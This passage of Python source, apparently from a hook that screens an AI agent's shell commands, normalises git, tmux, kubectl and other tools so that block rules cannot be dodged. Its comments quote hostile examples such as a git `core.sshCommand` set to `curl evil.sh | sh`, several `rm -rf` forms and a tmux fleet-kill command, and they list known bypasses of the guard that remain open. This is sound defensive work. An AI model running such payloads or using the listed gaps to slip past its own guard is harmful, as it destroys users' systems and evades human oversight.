    """The remote command of an ``ssh`` segment, or None.

    ``raws`` is the segment's resolved tokens WITH content text intact (the
    masked entry has already blanked quoted payloads — which is exactly why
    this reads the raw list). Head-gated: ssh must be the segment's real
    command (past the wrapper chain), so quoted PROSE mentioning ssh
    (``git commit -m "ssh prod rm -rf /"``) never triggers a rescan — the
    content token is one word of the chain walk and is not ``ssh``.
    """
    idx = None
    for i, word in enumerate(raws):
        base = word.rsplit("/", 1)[-1]
        if base in _POSITION_WRAPPERS or _ASSIGN_TOKEN_RE.match(word):
            continue
        if word.startswith("-") or (word[:1].isdigit()):
            continue
        if base in ("ssh", "mosh"):
            idx = i
        break
    if idx is None:
        return None
    i = idx + 1
    while i < len(raws):
        tok = raws[i]
        if tok == "--":
            i += 1
            break
        if tok.startswith("-"):
            if tok in _SSH_VALUE_OPTS and len(tok) == 2:
                i += 2
            else:
                i += 1
            continue
        break
    # raws[i] is the host; the remote command is everything after it.
    payload = raws[i + 1:]
    while payload and payload[0] == "--":
        payload = payload[1:]
    if not payload:
        return None
    return " ".join(payload)


# git config keys whose VALUE names a program git will execute (#921).
# ``git -c core.sshCommand="curl evil.sh | sh" fetch`` runs the payload;
# coverage used to exist only when the payload's spelling happened to match a
# content rule. Enumerated from the git 2.50 documentation (documented
# provenance): a missing key degrades to today's behaviour, never worse.
_GIT_EXEC_CONFIG_KEYS = frozenset({
    "core.sshcommand", "core.fsmonitor", "core.pager", "core.editor",
    "core.askpass", "core.alternaterefscommand", "sequence.editor",
    "gpg.program", "diff.external", "credential.helper",
    "uploadpack.packobjectshook",
})
_GIT_EXEC_CONFIG_PREFIX_RE = re.compile(
    r"^(?:filter\.[^.]+\.(?:clean|smudge|process)"
    r"|difftool\.[^.]+\.cmd"
    r"|mergetool\.[^.]+\.cmd"
    r"|merge\.[^.]+\.driver"
    r"|remote\.[^.]+\.(?:uploadpack|receivepack)"
    r"|browser\.[^.]+\.cmd"
    r"|man\.[^.]+\.cmd)$",
    re.IGNORECASE,
)


def _git_exec_config_key(key: str) -> bool:
    """True when git config ``key`` names a program git will run."""
    k = key.strip().lower()
    return k in _GIT_EXEC_CONFIG_KEYS or bool(_GIT_EXEC_CONFIG_PREFIX_RE.match(k))


def _git_exec_config_payloads(raws: List[str]) -> List[str]:
    """Values of exec-valued ``git -c key=value`` assignments in this segment.

    An ``alias.<x>`` value starting with ``!`` is a shell command too (the
    bang form); its payload is the text after the ``!``.
    """
    if not any(w.rsplit("/", 1)[-1] == "git" for w in raws):
        return []
    out: List[str] = []
    expect_value = False
    for tok in raws:
        if expect_value:
            expect_value = False
            entry = tok
        elif tok == "-c":
            expect_value = True
            continue
        elif tok.startswith("-c") and "=" in tok:
            entry = tok[2:]  # attached form: git accepts `-ckey=value`
        else:
            continue
        key, sep, value = entry.partition("=")
        if not sep or not value:
            continue
        if _git_exec_config_key(key):
            out.append(value)
        elif key.strip().lower().startswith("alias.") and value.startswith("!"):
            out.append(value[1:])
    return out


#
# GLOBAL OPTIONS BEFORE THE SUBCOMMAND (#913 for git, #919 for the class)
#
# Every rule that names a tool — both the hand-written ``bashToolPatterns`` in
# the rule YAMLs (``\bgit\s+push\s+--force\b``, ``\btmux\s+kill-server\b``) and
# the tooldef-generated ones from ``_cmd_to_regex`` (``\bgit\s+commit\b``) —
# assumes the subcommand sits adjacent to the tool name. It doesn't have to:
# ``git -C <dir> <cmd>`` is the idiomatic way to operate on a repo without
# ``cd``, and ``\s+`` cannot span ``-C /repo``. That single assumption defeated
# EVERY git rule (#913), and then every rule for fourteen more tools (#919) —
# including ``tmux -L agentwire kill-server``, whose rule exists to stop an
# agent destroying the fleet it is running inside, and the
# production-TARGETING options of aws/kubectl/docker/redis-cli, where the guard
# held for the default target and dropped for the named remote one.
#
# ONE normalizer, driven by a DATA TABLE. Not a generalized regex (a guess
# about grammars nobody measured) and not fifteen per-tool normalizers (that is
# "model each wrapper's own grammar", the mistake #918 declined to make, at one
# remove). Adding a sixteenth tool is a table row.
#
# This is strictly ADDITIVE — the un-stripped forms stay in the haystack list.
# A rule that legitimately cares WHICH repo/cluster/profile is being targeted
# (a path rule, an allowlist check) still sees ``-C /repo`` in the raw command;
# stripping can only ever remove tokens, so the extra variant can introduce no
# path a rule didn't already see.
#
# PROVENANCE IS PART OF THE ROW, because both directions of a wrong arity guess
# FAIL OPEN and neither is visible:
#
#   marked value-taking but actually bare -> the SUBCOMMAND is eaten  -> allow
#   marked bare but actually value-taking -> the VALUE stays inline   -> allow
#
# There is no conservative direction to lean, and a wrong row never surfaces as
# a spurious block — only as an ALLOW where a corpus row expected a block, and
# only if that corpus row exists. So an unverified row cannot be made safe,
# only HONEST: every row names how its grammar was established, and
# ``test_every_table_row_has_corpus_coverage`` fails a row that no command in
# the acceptance corpus would contradict.

_MEASURED = "measured"      # probed against the real binary, version recorded
_DOCUMENTED = "documented"  # binary not runnable here; from the official docs


def _grammar(
    provenance: str,
    version: str,
    value: Tuple[str, ...] = (),
    flag: Tuple[str, ...] = (),
    value_eq_only: Tuple[str, ...] = (),
    short_cluster: bool = False,
    plus_selector: bool = False,
) -> Dict[str, Any]:
    """One tool's global-option grammar.

    ``value``          option consumes a SEPARATE following argument (the ``=``
                       form is handled generically for these too).
    ``flag``           stands alone, consumes nothing.
    ``value_eq_only``  ONLY the ``--opt=value`` form exists (terraform's
                       ``-chdir=DIR``); a bare one must not eat the next token.
    ``short_cluster``  getopt/pflag-style short options: ``-Lname`` (attached)
                       and ``-2Lname`` (bundled) are accepted. THIS IS PER
                       TOOL, not a global convention: git REJECTS ``-C/tmp``
                       (measured), which is why #918 could ignore attached
                       forms — correct for git and wrong for tmux, where the
                       fleet-kill bypass has three spellings, not one.
    ``plus_selector``  a leading ``+token`` selector (cargo's ``+nightly``).
    ``provenance``     ``_MEASURED`` or ``_DOCUMENTED`` — see the note above;
                       required, because an unmarked row is the failure mode.
    """
    return {
        "value": frozenset(value),
        "flag": frozenset(flag),
        "value_eq_only": frozenset(value_eq_only),
        "short_cluster": short_cluster,
        "plus_selector": plus_selector,
        "provenance": provenance,
        "version": version,
    }


# THIS TABLE LIVES IN CODE, NOT IN A ``rules/*.yaml``, AND THAT IS A
# DEPLOYMENT REQUIREMENT RATHER THAN A STYLE CHOICE. ``heal_damage_control``
# treats the two classes differently: hook scripts self-heal when STALE
# (drift check, then copy), while rules and tooldefs are install-missing-only
# (``if not target.exists()``), so an EXISTING rule file is never brought
# forward by any command. A table shipped as YAML would merge green, pass
# review — and be INERT on day one on every installation that already has the
# file, with no supported way to update it. #918 deploys because it touched
# only ``_core.py`` and the generated hooks; #675's anchoring does not, because
# it lives in ``rules/git.yaml``. Same repo, same merge, opposite outcomes,
# decided purely by which file the fix landed in. Do not move this to YAML.
#
# Measured, not read off a usage line. git's own usage advertises only the
# ``=`` form while the binary accepts both, and ``--exec-path`` looks
# value-taking and is not — so each row below was established by running the
# binary: ``TOOL <opt> <harmless-subcommand>`` and asking whether the
# subcommand still ran (option is bare) or was swallowed (option took it).
#
# WHICH BINARY, because a ``measured`` row is only as good as the thing
# measured, and "measured against a static build I downloaded" is a different
# claim from "measured against what the operator runs". Measured 2026-08-06:
#
#   already on the machine  git 2.50.1 (/usr/bin/git, Apple), tmux 3.5a
#                           (homebrew), gcloud 560.0.0, npm 10.8.2, supabase
#                           2.105.0 — these ARE what the operator runs
#   downloaded static build kubectl v1.36.3 (dl.k8s.io), helm 3.16.4
#                           (get.helm.sh), terraform 1.10.5
#                           (releases.hashicorp.com), pulumi 3.145.0
#                           (get.pulumi.com), docker 27.4.1
#                           (download.docker.com/mac/static)
#   pkg payload, expanded   aws-cli 2.36.17 (awscli.amazonaws.com/AWSCLIV2.pkg,
#                           expanded with pkgutil, never installed)
#   homebrew bottle, unpacked  redis-cli 8.10.0, mysqladmin 9.7.1 (brew fetch,
#                           tar-extracted; never brew install)
#   rustup, scratchpad-only cargo 1.97.1 via the rustup shim, with CARGO_HOME
#                           and RUSTUP_HOME pointed at a temp dir
#   NOT MEASURED            pnpm — the corepack shim on this machine dies with
#                           ERR_VM_DYNAMIC_IMPORT_CALLBACK_MISSING
#
# Nothing was installed on the host and nothing was placed on the host PATH.
# Re-measuring a row on a tool upgrade means re-running the same differential
# probe; the version in each row says what it was measured against.
_GLOBAL_OPTION_TABLE: Dict[str, Dict[str, Any]] = {
    # git 2.50.1 (Apple Git-155). ``-C``/``-c`` need a SEPARATE argument —
    # ``-C/tmp`` is rejected by git itself, so no short-cluster handling.
    # ``--exec-path`` bare prints and exits: eating the next token there would
    # swallow a subcommand.
    "git": _grammar(
        _MEASURED, "2.50.1",
        value=("-C", "-c", "--git-dir", "--work-tree", "--namespace",
               "--config-env", "--attr-source"),
        flag=("-p", "-P", "--paginate", "--no-pager", "--bare", "--exec-path",
              "--no-optional-locks", "--no-replace-objects", "--no-lazy-fetch",
              "--no-advice", "--literal-pathspecs", "--glob-pathspecs",
              "--noglob-pathspecs", "--icase-pathspecs", "--html-path",
              "--man-path", "--info-path"),
    ),
    # tmux 3.5a — getopt, so ``-Lname`` and ``-2Lname`` parse identically to
    # ``-L name``. Confirmed by the socket path coming back in tmux's own
    # "error connecting to /private/tmp/tmux-501/<name>" for all three forms,
    # against a control run that shows no socket name at all.
    "tmux": _grammar(
        _MEASURED, "3.5a",
        value=("-c", "-f", "-L", "-S", "-T"),
        flag=("-2", "-C", "-l", "-N", "-u", "-U", "-v", "-V"),
        short_cluster=True,
    ),
    # kubectl v1.36.3 (pflag). The bypassing option here is the
    # production-TARGETING one: the guard held for the default context and
    # dropped for the named remote cluster.
    "kubectl": _grammar(
        _MEASURED, "v1.36.3",
        value=("--context", "-n", "--namespace", "--kubeconfig", "--cluster",
               "--user", "--token", "--server", "-s", "--as", "--as-group",
               "--as-uid", "--request-timeout", "--certificate-authority",
               "--client-key", "--client-certificate", "--cache-dir",
               "--tls-server-name", "--username", "--password", "-v", "--v",
               "--profile", "--profile-output", "--log-flush-frequency",
               "--kuberc"),
        flag=("--insecure-skip-tls-verify", "--warnings-as-errors",
              "--disable-compression", "--match-server-version"),
        short_cluster=True,
    ),
    # docker 27.4.1 (pflag). `--context prod` / `-H tcp://prod:2375` are how a
    # local command reaches a production daemon.
    "docker": _grammar(
        _MEASURED, "27.4.1",
        value=("--context", "-c", "--host", "-H", "--config", "--log-level",
               "-l", "--tlscacert", "--tlscert", "--tlskey"),
        flag=("--tls", "--tlsverify", "--debug", "-D"),
        short_cluster=True,
    ),
    # aws-cli 2.36.17 (argparse). No short global options, so no clustering.
    # `--output` and `--color` LOOK bare to a naive probe — an invalid value
    # produces the same "invalid choice" text as an unknown subcommand — and
    # are value-taking; the parser's own "expected one argument" settles it.
    "aws": _grammar(
        _MEASURED, "2.36.17",
        value=("--profile", "--region", "--endpoint-url", "--output", "--query",
               "--ca-bundle", "--cli-read-timeout", "--cli-connect-timeout",
               "--color"),
        flag=("--debug", "--no-verify-ssl", "--no-paginate", "--no-sign-request",
              "--no-cli-pager", "--no-cli-auto-prompt"),
    ),
    # Google Cloud SDK 560.0.0. `--verbosity` is value-taking for the same
    # reason as aws's `--output`.
    "gcloud": _grammar(
        _MEASURED, "560.0.0",
        value=("--project", "--account", "--configuration", "--billing-project",
               "--impersonate-service-account", "--access-token-file",
               "--verbosity", "--format", "--trace-token"),
        flag=("--quiet", "-q", "--log-http", "--no-user-output-enabled"),
    ),
    # helm 3.16.4 (pflag).
    "helm": _grammar(
        _MEASURED, "3.16.4",
        value=("--kube-context", "--kubeconfig", "--namespace", "-n",
               "--kube-apiserver", "--kube-token", "--registry-config",
               "--repository-cache", "--repository-config", "--burst-limit",
               "--kube-as-user", "--kube-as-group", "--kube-ca-file",
               "--kube-tls-server-name", "--qps"),
        flag=("--debug", "--kube-insecure-skip-tls-verify"),
        short_cluster=True,
    ),
    # terraform 1.10.5. `-chdir=DIR` is the ONLY value-taking global option and
    # it exists in the `=` form only — a bare `-chdir /infra` is not accepted,
    # so it must not eat the next token.
    #
    # `-help` and `-version` are deliberately ABSENT though they are real
    # global flags: both short-circuit execution, so `terraform -help destroy`
    # prints help and destroys nothing. Stripping them would normalize a help
    # invocation into `terraform destroy` and BLOCK it — a false positive on a
    # command people actually type. Omitting them only costs a variant.
    "terraform": _grammar(
        _MEASURED, "1.10.5",
        value_eq_only=("-chdir",),
    ),
    # pulumi 3.145.0 (pflag) — `-C /infra` is the cwd override.
    "pulumi": _grammar(
        _MEASURED, "3.145.0",
        value=("-C", "--cwd", "--color", "--profiling", "--tracing",
               "--memprofilerate", "-v", "--verbose"),
        flag=("--logtostderr", "--non-interactive", "-e", "--emoji", "-Q",
              "--fully-qualify-stack-names", "--logflow",
              "--disable-integrity-checking"),
        short_cluster=True,
    ),
    # npm 10.8.2. npm treats ANY unrecognized `--long` as a config key, so this
    # row is the measured subset rather than a closed grammar; an unlisted
    # config key bails the scan and simply yields no variant.
    "npm": _grammar(
        _MEASURED, "10.8.2",
        value=("--prefix", "-C", "--userconfig", "--globalconfig", "--cache",
               "--registry", "--loglevel", "--workspace", "-w"),
        flag=("-g", "--global", "--no-workspaces", "--silent", "-s", "--json"),
        short_cluster=True,
    ),
    # pnpm — DOCUMENTED, not measured. The binary on this machine is broken
    # (corepack shim dies with ERR_VM_DYNAMIC_IMPORT_CALLBACK_MISSING), and the
    # ruling on #919 is not to install tools on the owner's machine to measure
    # them. `short_cluster` is left FALSE rather than guessed from the
    # getopt-shaped tools: an unverified True would strip clusters pnpm may
    # reject. Falsified by the `pnpm -C /srv publish` corpus row.
    "pnpm": _grammar(
        _DOCUMENTED, "pnpm 9.x/10.x docs",
        value=("-C", "--dir", "--filter", "--loglevel", "--reporter"),
        flag=("-w", "--workspace-root", "--stream", "--silent"),
    ),
    # cargo 1.97.1, invoked through the rustup shim (which is how `cargo` is
    # reached on any machine with rustup installed). `+nightly` is a TOOLCHAIN
    # SELECTOR, not an option — hence `plus_selector` rather than a flag entry.
    # `-Z` is omitted: it is nightly-only, so its arity is not measurable on a
    # stable toolchain and a guess here could swallow a subcommand.
    "cargo": _grammar(
        _MEASURED, "1.97.1",
        value=("--config", "--color"),
        flag=("--frozen", "--locked", "--offline", "-q", "--quiet", "-v",
              "--verbose"),
        plus_selector=True,
    ),
    # supabase 2.105.0 (cobra).
    "supabase": _grammar(
        _MEASURED, "2.105.0",
        value=("--workdir", "--dns-resolver", "--network-id", "--output", "-o"),
        flag=("--debug", "--experimental", "--create-ticket"),
        short_cluster=True,
    ),
    # redis-cli 8.10.0. Hand-rolled argv comparison, NOT getopt: `-hprod.redis`
    # is rejected ("Unrecognized option or bad number of args for: '-hzzhost'")
    # and `--user=x` is not accepted either. So short_cluster is FALSE here
    # even though every other short-option tool in this table sets it True —
    # which is the argument for measuring the property per tool.
    "redis-cli": _grammar(
        _MEASURED, "8.10.0",
        value=("-h", "-p", "-s", "-a", "-u", "-n", "-t", "-r", "-i", "--user",
               "--pass"),
        flag=("-x", "--tls", "--no-raw", "--scan"),
    ),
    # mysqladmin 9.7.1 (getopt): `-uroot` and `-furoot` both parse. Arity from
    # the parser's own "option '-u' requires an argument", since mysqladmin
    # connects before it validates the command and so has no usable
    # subcommand-survived marker.
    #
    # `-p` is deliberately ABSENT: its value is OPTIONAL and attached-only
    # (`-psecret`, but bare `-p` prompts). Neither category models that, and
    # the wrong one would eat the command. `mysqladmin -psecret drop db` bails
    # the cluster scan and yields no variant — an under-strip, recorded here.
    #
    # KNOWN LIMIT: mysql's long options accept unique-prefix abbreviation
    # (`--us=root`), which no exact-match table can enumerate. Those forms keep
    # the bypass.
    "mysqladmin": _grammar(
        _MEASURED, "9.7.1",
        value=("-u", "-h", "-P", "-S", "--user", "--host", "--port", "--socket",
               "--protocol"),
        flag=("-f", "--force", "-s", "--silent", "-C", "--compress", "-w",
              "--wait", "--no-defaults"),
        short_cluster=True,
    ),
    # NOT IN THIS TABLE, and deliberately:
    #
    #   gh — `gh -R owner/name repo delete` is NOT a bypass. Measured: `gh -R
    #   cli/cli repo view` -> "unknown shorthand flag: 'R' in -R", and `gh
    #   --repo …` -> "unknown flag: --repo". Both are per-COMMAND flags, so the
    #   command never runs and there is nothing to normalize. It was listed as
    #   a bypass in #913's review notes and in #919's issue body (which is why
    #   that issue says 15 tools and this table has 14 plus git); the reviewer
    #   disproved it. Pinned by `test_gh_is_not_a_bypass_and_has_no_row` so a
    #   future rebuild-from-notes cannot quietly re-add it.
}

# Tokens allowed to precede the tool while still counting as an invocation
# (``sudo git -C /repo push --force`` must normalize too — the un-stripped
# ``sudo git push --force`` already matches, so leaving this out would keep the
# very inconsistency the rule is meant to remove). ``_MASK`` covers a leading
# ``VAR=value`` assignment, which ``masked_subcommands`` has already masked.
#
# The exclusion is about ARITY AS WRITTEN, not about which wrapper it is. Every
# name below is covered when it appears BARE; the same name carrying its own
# arguments is not — ``xargs git …`` normalizes, ``xargs -n1 git …`` does not,
# and likewise ``nice`` vs ``nice -n 5``. The wrapper's argument is an
# unrecognized token, the scan bails, and no variant is produced, so that form
# keeps the bypass.
#
# Naming wrappers rather than arity is precisely the error this comment used to
# make: it listed ``xargs -n1`` as an excluded WRAPPER, which read as excluding
# ``xargs``, and bare ``xargs git -C /repo push --force`` stayed a live bypass
# under a comment implying otherwise.
#
# Argument-carrying forms are out of scope rather than half-handled, because
# consuming them means modelling each wrapper's own grammar — this bug's
# mistake at one remove. Failure there is a MISSING haystack, never an
# over-strip: we add nothing rather than stripping too much.
_WRAPPER_PREFIXES = {
    "sudo", "doas", "env", "command", "time", "nice", "nohup", "xargs", _MASK,
}


def _short_cluster_span(word: str, grammar: Dict[str, Any]) -> Optional[int]:
    """Tokens consumed by a bundled/attached short-option cluster, or ``None``.

    ``-Lname`` is one token (the value rides along); ``-uL name`` is two (the
    value-taking option ends the cluster). An unrecognized character bails the
    whole cluster rather than guessing — a guess here can swallow a subcommand.
    """
    if not word.startswith("-") or word.startswith("--") or len(word) < 2:
        return None
    chars = word[1:]
    for idx, ch in enumerate(chars):
        opt = "-" + ch
        if opt in grammar["value"]:
            # Anything left in the cluster IS the value; otherwise it is the
            # next token.
            return 1 if idx < len(chars) - 1 else 2
        if opt in grammar["flag"]:
            continue
        return None
    return 1


def _strip_global_options(words: List[str]) -> Optional[List[str]]:
    """Return ``words`` with the tool's global options removed, or ``None``.

    ``None`` means "no normalized variant to add": not an invocation of a tool
    in the table, no global options present, or nothing left after the options.
    """
    tool_idx = None
    grammar = None
    wrapped = False
    for i, w in enumerate(words):
        candidate = _GLOBAL_OPTION_TABLE.get(w.rsplit("/", 1)[-1])
        if candidate is not None:
            tool_idx = i
            grammar = candidate
            break
        if w in _WRAPPER_PREFIXES or w.rsplit("/", 1)[-1] in _POSITION_WRAPPERS:
            wrapped = True
            continue
        if _ASSIGN_TOKEN_RE.match(w):
            continue
        # Past a wrapper, its own options and operands (``timeout 5``, ``nice
        # -n 5``, ``sudo -u me``, ``flock /tmp/l``) sit before the tool.
        # Skipping them cannot over-strip: stripping starts AFTER the tool, and
        # the variant is additive and position-gated for anchored rules, so an
        # unrelated word that is merely skipped only yields a variant no rule
        # is allowed to start in. Without a wrapper the first word decides.
        if not wrapped:
            return None
    if grammar is None:
        return None

    i = tool_idx + 1
    stripped = False
    while i < len(words):
        word = words[i]
        if grammar["plus_selector"] and len(word) > 1 and word.startswith("+"):
            i += 1
            stripped = True
            continue
        if word in grammar["value"]:
            # Consumes the following argument along with the flag — dropping
            # only the flag would leave the value sitting where the subcommand
            # should be, and the rule would still miss.
            i += 2
            stripped = True
            continue
        if word in grammar["flag"]:
            i += 1
            stripped = True
            continue
        base = word.split("=", 1)[0]
        if "=" in word and (
            base in grammar["value"]
            or base in grammar["flag"]
            or base in grammar["value_eq_only"]
        ):
            i += 1
            stripped = True
            continue
        if grammar["short_cluster"]:
            span = _short_cluster_span(word, grammar)
            if span is not None:
                i += span
                stripped = True
                continue
        # MAINTENANCE EDGE: an option a tool adds after the measured version is
        # an unrecognized token here, so the scan stops and the partial strip
        # leaves the subcommand still out of reach — ``git --future-opt -C /r
        # push --force`` reads as allow. Not exploitable today (the tool
        # rejects the unknown option itself), and nothing in the suite fails
        # when a tool grows one, so re-measure a row on a tool upgrade.
        # Stopping is deliberate: the alternative — treating anything
        # option-shaped as strippable — would let an unknown value-taking
        # option swallow the subcommand.
        break

    if not stripped or i >= len(words):
        return None
    return words[: tool_idx + 1] + words[i:]


def global_option_normalized_haystacks(command: str) -> List[str]:
    """Return the global-options-stripped forms of ``command``, if any.

    This is an ADDITIVE haystack, kept alongside the raw and masked lists
    rather than rewriting either, and fed to ALL rules — anchored and
    unanchored alike. Both halves of that sentence are load-bearing.

    ADDITIVE, because stripping is DELETION. Some stripped values are COMMAND
    PAYLOADS: ``-c <k>=<v>`` values are executed by git (``core.sshCommand``,
    ``core.pager``, ``alias.*``, ``core.fsmonitor``), and ``tmux -c
    '<shell-command>'`` is executed by tmux, so the value is a command sitting
    in the haystack. Where a content rule DOES match that payload — the deletion rules
    catch an ``rm``-shaped one — rewriting a haystack in place would delete it
    from the only place it appears and turn a block into an allow: the fix
    creating a worse bug than the one it closes. Coverage of these payloads is
    partial, not a guarantee this function provides: a ``curl … | sh`` value is
    allowed with or without normalization. Additivity preserves whatever
    coverage exists; it does not create any.
    (Note it is deletion, not masking, that would lose them: ``masked_subcommands``
    blanks a token only when it is FULLY quoted, and ``core.pager='…'`` carries
    an unquoted ``core.pager=`` prefix, so the payload survives masking and is
    visible in both existing haystacks.) A rule that legitimately cares WHICH
    repo, cluster, profile or socket is being targeted — a path rule, an
    unattended path scope (#914) — reads those same un-stripped forms: the
    ``-C``/``--context``/``-L`` argument is set aside, not discarded.

    FED TO ALL RULES, because the intersection "must stay unanchored AND
    global-option-bypassable" is unreachable by a two-way split. Rules that are
    deliberately unanchored to catch an ssh-wrapped form would never see
    normalization and would stay permanently bypassed.

    Masking is applied to the new path exactly as it is to the old one — the
    variant is built from the MASKED token lists, so the anchored path receives
    the normalized command masked, rather than being handed an unmasked
    haystack that would reopen #675 on every anchored rule.
    """
    out: List[str] = []
    for words in _masked_subcommand_words(command):
        normalized = _strip_global_options(words)
        if normalized is not None:
            joined = " ".join(normalized)
            if joined not in out:
                out.append(joined)
    return out


def _strip_heredoc_bodies(command: str) -> str:
    """Remove heredoc body lines (``<<EOF … EOF``) — they are content."""
    out: List[str] = []
    pos = 0
    for h in _heredocs(command):
        out.append(command[pos : h.body_start])
        pos = h.end
    out.append(command[pos:])
    return "".join(out)


#
# COMPOUND-COMMAND OPENERS (#1112)
#
# `case x in a) rm …`, `then rm …`, `{ rm; }`, `f(){ rm; }`, `(rm …)`: the word
# that RUNS is not the segment's first word. Every walker that anchors on
# command position (anchored rules, ssh payload, global options, concealment,
# stdin-program stages, prose blanking) used to stop at `case`/`then`/`{`, so
# the same command was judged differently inside a body than at top level.
# ONE helper drops the syntax before those walkers run; bash semantics are kept
# exactly: `{` and the keywords are reserved only as whole words (`{rm`, `do{`
# are ordinary words), while `(` and `)` always break words, so `(rm`, `then(`,
# `a)rm` and `f(){` open a command position glued or spaced.
_OPENER_WORDS = frozenset({
    "if", "then", "else", "elif", "while", "until", "do", "!", "{",
    "time", "coproc", "function",
})
_NAMED_OPENERS = frozenset({"coproc", "function"})
_FUNC_HEADER_RE = _rx(r"^[^\s()$`'\"{}=;&|<>]+\(\)(\{?)$", 0)
_KEYWORD_PAREN_RE = _rx(r"^(if|then|else|elif|while|until|do|time|coproc)(\(.*)$", 0)

#: Stands in for a `)` that is DATA (quoted, escaped, or inside `${...}` /
#: `$'...'` / an assignment subscript) in token text handed to
#: :func:`strip_command_openers`, which cannot see quotes: tokens arrive
#: quote-resolved, so `A='a)b' rm` and `A=${x:-)} rm` looked like a case arm
#: ending at the `)` and the stripped remainder swallowed the verb (#1119).
#: The scanner writes it, `_masked_subcommand_entries` turns it back into `)`
#: right after stripping, so no rule ever sees it.
_DATA_PAREN = "\x02"

#: Tokens of one command: ``(text, fully_quoted, expands)``.
_Tok = Tuple[str, bool, bool]


def _arm_pattern_end(text: str, in_case_header: bool = False) -> int:
    """Index of the ``)`` that ends a case-arm pattern inside ``text``, or -1.

    Tokens arrive with their quotes already resolved, so a ``)`` inside
    ``"a)b"``, ``[)]`` or ``a\\)`` cannot be told from the terminator. The
    answer is therefore deliberately conservative for the OPERATION: the FIRST
    ``)`` counts, and the caller strips again while the remainder still holds
    one, so extra pattern parens are consumed and the body is never left hidden
    (a harmless script may be over-read, never a destructive one under-read).
    The only guard is at a segment start that opens a command substitution
    (``$(date)``, a backtick), where a ``)`` is the substitution's own; there
    the paren depth must go NEGATIVE (``$(echo a))``) to count.
    """
    if not in_case_header and (text.startswith("$(") or text.startswith("`")):
        depth = 0
        for i, c in enumerate(text):
            depth += (c == "(") - (c == ")")
            if depth < 0:
                return i
        return -1
    return _first_paren_outside_spans(text)


#
# WORD SPANS (#1119)
#
# A `)`, `;`, `&`, `|` or newline INSIDE `${...}`, `$'...'` or an assignment
# subscript `a[...]=` is data to bash: the word is one word. A splitter that
# reads those characters as syntax cuts the word in two, and the half that
# starts `}`/`]` becomes the "command" — `A=${x:-;} rm -rf /x` then reads as
# `} rm -rf /x` and the real verb is an argument. These readers return the
# index just past the span, or -1 when it does not close, and an unclosed span
# is NOT a span: the caller falls back to plain character-by-character
# scanning, which sees every verb in the remainder (errs closed for the
# operation). Brace nesting follows bash: only `${` nests, a bare `{` is data.


def _quoted_end(s: str, i: int) -> int:
    """Index past the quote opened at ``s[i]`` (``'`` or ``"``), or -1."""
    q, j, n = s[i], i + 1, len(s)
    while j < n:
        if q == '"' and s[j] == "\\":
            j += 2
            continue
        if s[j] == q:
            return j + 1
        j += 1
    return -1


def _subst_end(s: str, i: int) -> int:
    """Index past the ``$(...)`` / backtick span opened at ``s[i]``, or -1."""
    if s[i] == "`":
        j = s.find("`", i + 1)
        return -1 if j == -1 else j + 1
    depth, j, n = 1, i + 2, len(s)
    while j < n and depth:
        ch = s[j]
        if ch == "\\":
            j += 2
            continue
        if ch in "'\"":
            j = _quoted_end(s, j)
            if j == -1:
                return -1
            continue
        depth += (ch == "(") - (ch == ")")
        j += 1
    return -1 if depth else j


def _param_expansion_end(s: str, i: int, in_dquote: bool = False) -> int:
    """Index past the ``${...}`` opened at ``s[i]``, or -1 (quote/escape/nest aware).

    ``in_dquote`` is the context: inside ``"${x:-'}"`` a single quote is a
    LITERAL (bash and zsh agree), so only ``"`` opens a nested quote there;
    reading it as a quote swallowed the ``}"`` and the commands after it as
    data. Unquoted, ``'`` quotes in both shells.
    """
    depth, j, n = 1, i + 2, len(s)
    while j < n and depth:
        ch = s[j]
        if ch == "\\":
            j += 2
        elif ch == '"' or (ch == "'" and not in_dquote):
            j = _quoted_end(s, j)
            if j == -1:
                return -1
        elif ch == "$" and s.startswith("${", j):
            depth += 1
            j += 2
        elif ch == "$" and s.startswith("$(", j) or ch == "`":
            j = _subst_end(s, j)
            if j == -1:
                return -1
        else:
            depth -= ch == "}"
            j += 1
    return -1 if depth else j


def _ansi_c_end(s: str, i: int) -> int:
    """Index of the closing quote of a ``$'...'`` body starting at ``s[i]``, or -1."""
    j, n = i, len(s)
    while j < n:
        if s[j] == "\\":
            j += 2
        elif s[j] == "'":
            return j
        else:
            j += 1
    return -1


def _subscript_end(s: str, i: int) -> int:
    """Index past an assignment subscript ``[...]`` at ``s[i]`` that is followed by ``=``/``+=``, or -1.

    bash reads ``a[;]=1`` / ``a[)]=1`` as one assignment word, but only when
    the closing ``]`` is followed by the assignment operator — otherwise the
    ``;`` is a separator, and swallowing it would hide the command after it.
    """
    depth, j, n = 0, i, len(s)
    while j < n:
        ch = s[j]
        if ch == "\\":
            j += 2
            continue
        if ch in "'\"":
            j = _quoted_end(s, j)
            if j == -1:
                return -1
            continue
        depth += (ch == "[") - (ch == "]")
        j += 1
        if depth == 0:
            return j if s.startswith("=", j) or s.startswith("+=", j) else -1
    return -1


def _first_paren_outside_spans(text: str) -> int:
    """Index of the first ``)`` in ``text`` that is not inside ``${...}`` or ``[...]``, or -1.

    A case-arm pattern's terminator is the first ``)`` that is not data. The
    old ``text.find(")")`` took the first one anywhere, so ``A=${x:-)} rm`` was
    read as an arm ending inside the expansion and the leftover ``}`` became
    the command (#1119). An unclosed span does not hide anything: its ``)``
    still counts, which only ever over-strips.
    """
    i, n = 0, len(text)
    while i < n:
        ch = text[i]
        if ch == ")":
            return i
        if ch == "$" and text.startswith("${", i):
            end = _param_expansion_end(text, i)
            if end != -1:
                i = end
                continue
        elif ch == "[":
            close = text.find("]", i + 2 if text.startswith(("[!", "[^"), i) else i + 1)
            if close != -1:
                i = close + 1
                continue
        i += 1
    return -1



def strip_command_openers(toks: List[_Tok]) -> List[_Tok]:
    """``toks`` with leading compound-command syntax removed (see section note)."""
    toks = list(toks)
    while toks:
        text, fq, ex = toks[0]
        if fq or ex:
            break
        if text.startswith("(") or text.startswith("!("):
            rest = text.lstrip("!").lstrip("(")
            toks[0:1] = [(rest, False, False)] if rest else []
            continue
        m = _KEYWORD_PAREN_RE.match(text)
        if m:
            toks[0:1] = [(m.group(1), False, False), (m.group(2), False, False)]
            continue
        if text in _OPENER_WORDS:
            del toks[0]
            if text in _NAMED_OPENERS and len(toks) >= 2 and toks[1][0] == "{":
                del toks[0]
            elif text == "time":
                while toks and not toks[0][1] and toks[0][0].startswith("-"):
                    del toks[0]
            continue
        if text == "case":
            # No ``in`` (malformed): scan every word for the pattern end rather
            # than leave the body hidden.
            j = next((k for k in range(2, len(toks)) if toks[k][0] == "in" and not toks[k][1]), 0)
            end = -1
            for k in range(j + 1, len(toks)):
                if not toks[k][1] and _arm_pattern_end(toks[k][0], True) != -1:
                    end = k
